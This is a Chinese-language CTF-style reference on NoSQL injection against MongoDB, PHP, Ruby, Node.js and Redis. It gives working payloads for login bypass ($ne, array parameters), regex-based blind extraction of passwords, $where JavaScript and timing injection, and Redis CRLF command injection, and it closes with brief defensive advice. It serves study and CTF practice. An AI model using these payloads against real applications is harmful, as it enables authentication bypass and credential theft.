# NoSQL 注入

## 概述

NoSQL 注入是针对非关系型数据库（如 MongoDB、Redis、CouchDB）的注入攻击。与 SQL 注入不同，NoSQL 注入通常不是基于字符串拼接（但也存在），而是利用查询语法中的操作符注入（如 `$ne`、`$regex`、`$gt`）、JSON 注入或数组注入。CTF 中 NoSQL 注入主要出现在使用 MongoDB 作为后端的 Node.js 或 PHP 应用中。

## 常见攻击手法

### 1. 永真式攻击

利用永真条件绕过认证或筛选条件。

- **MongoDB 永真查询**：
  ```javascript
  // 正常查询
  db.users.find({username: 'admin', password: 'correct'})
  // 注入后
  db.users.find({username: 'admin', password: {$ne: ''}})
  // 或
  db.users.find({$or: [{username: 'admin'}, {password: {$ne: ''}}]})
  ```

- **HTTP 请求中**（Node.js + Express + MongoDB）：
  ```json
  POST /login HTTP/1.1
  Content-Type: application/json
  
  {"username": "admin", "password": {"$ne": ""}}
  ```

- **URL 编码形式**（通过查询字符串）：
  ```
  POST /login?username=admin&password[$ne]=
  ```

### 2. PHP 数组注入

PHP 使用 MongoDB 驱动时，利用 PHP 数组语法注入操作符。

- **登录绕过**：
  ```
  POST /login.php HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  
  username=admin&password[$ne]=
  ```

- **查询注入**：
  ```
  GET /api/users?username[$regex]=admin.*
  ```

PHP 的 `$_GET`、`$_POST` 会将 `key[]` 或 `key[$ne]` 解析为数组结构。

### 3. Ruby 数组注入

Ruby 的 `params` 对象也支持嵌套参数，类似 PHP：

```ruby
# 登录绕过
POST /login
username=admin&password[$ne]=
```

Ruby 的 `Mongoid` 或 `MongoDB Ruby Driver` 可直接处理操作符参数。

### 4. JavaScript 注入攻击

当后端直接将用户输入拼接到 JavaScript 查询中时，可能注入任意 JS 代码。

- **MongoDB $where 注入**：
  ```javascript
  db.users.find({$where: "this.username == '" + userInput + "'"})
  // 注入：' || 1==1 //
  // 结果：this.username == '' || 1==1 //'
  ```

- **利用 $where 执行 JavaScript**：
  ```javascript
  // 注入 sleep 函数
  username='; sleep(5000); var a='
  ```

- **Node.js NoSQL 注入**：
  ```javascript
  // 不安全的查询构建
  const query = { username: req.body.username };
  // 攻击者发送：{"username": {"$regex": ".*"}}
  // 可匹配所有用户
  ```

### 5. 正则注入 ($regex)

利用 MongoDB 的 `$regex` 操作符进行盲注，类似 SQL 盲注中的 `LIKE`。

- **布尔盲注**：
  ```json
  {"username": {"$regex": "^a"}}
  // true → 用户存在，继续下一字符
  // false → 用户名不以 a 开头
  ```

- **爆破 MongoDB UID**（`_id` 字段）：
  ```json
  {"_id": {"$regex": "^ObjectId(\"5f8..."}}
  ```

- **自动化脚本**：逐字符枚举正则匹配，每次新增一个字符直到完全匹配

### 6. 联合查询/聚合注入

MongoDB 聚合管道操作也可能存在注入：

```javascript
db.collection.aggregate([
  {$match: {username: userInput}},
  ...更多管道操作
])
```

如果 `$match` 条件可注入，可通过 `{$or: [...]}` 或 `{$where: ...}` 扩展查询范围。

### 7. MongoDB 操作符大全

| 操作符 | 用途 |
|--------|------|
| `$ne` | 不等于，如 `{"password": {"$ne": ""}}` |
| `$regex` | 正则匹配，如 `{"username": {"$regex": "^admin"}}` |
| `$gt` / `$gte` | 大于 / 大于等于 |
| `$lt` / `$lte` | 小于 / 小于等于 |
| `$in` | 在列表中，如 `{"role": {"$in": ["admin", "user"]}}` |
| `$nin` | 不在列表中 |
| `$exists` | 字段是否存在，如 `{"deleted": {"$exists": false}}` |
| `$where` | JavaScript 表达式 |
| `$or` / `$and` | 逻辑或 / 逻辑与 |
| `$not` | 逻辑非 |
| `$size` | 数组长度 |

### 8. 盲注技术

NoSQL 盲注通常结合 `$regex` 操作符进行逐字符推断：

- **布尔盲注**：根据响应页面内容差异（200 vs 404、有数据 vs 无数据）推断字符
- **时间盲注**：在 JavaScript 注入（`$where`）中使用 `sleep()` 或循环延迟

**自动化盲注脚本示例思路**：
1. 确定目标字段（如 password）
2. 使用 `$regex` 猜测每个字符：`{"password": {"$regex": "^" + known + guessed_char + ".*"}}`
3. 根据是否返回数据判断字符正确性
4. 逐个字符爆破出完整字符串

### 9. Redis 注入（特殊情况）

虽然 Redis 不是文档型 NoSQL 数据库，但若应用直接将用户输入拼接到 Redis 命令中，同样存在注入风险：

```python
# Python Redis 命令注入
r.execute_command("GET " + user_input)
# 注入：key\r\nSET flag "owned"\r\n
```

## 相关工具

| 工具 | 用途 |
|------|------|
| nosqli | NoSQL 注入检测与利用工具 |
| custom Python script | 正则盲注脚本编写 |
| Burp Suite | 手工测试 |

## 防御建议

- 使用参数化查询或 ORM 提供的安全 API
- 对用户输入做严格的数据类型校验（不允许传递对象/数组）
- 禁用 `$where` 操作符或对其中的用户输入做严格过滤
- 使用 `mongo-sanitize` 等库清理输入

## CTF 中的常见考点

- `{"password": {"$ne": ""}}` 绕过登录认证
- `{"username": {"$regex": "^f"}}` 盲注用户名字段
- PHP 数组注入 `username[$regex]=.*`
- `$where` JavaScript 注入执行任意 JS 代码

## 相关技能

- [SQL注入](SQL注入.md)
- [PHP](PHP.md)
- [Python](Python.md)
- [Node](Node.md)
- [Ruby](Ruby.md)
- [漏洞利用](../渗透测试/漏洞利用.md)
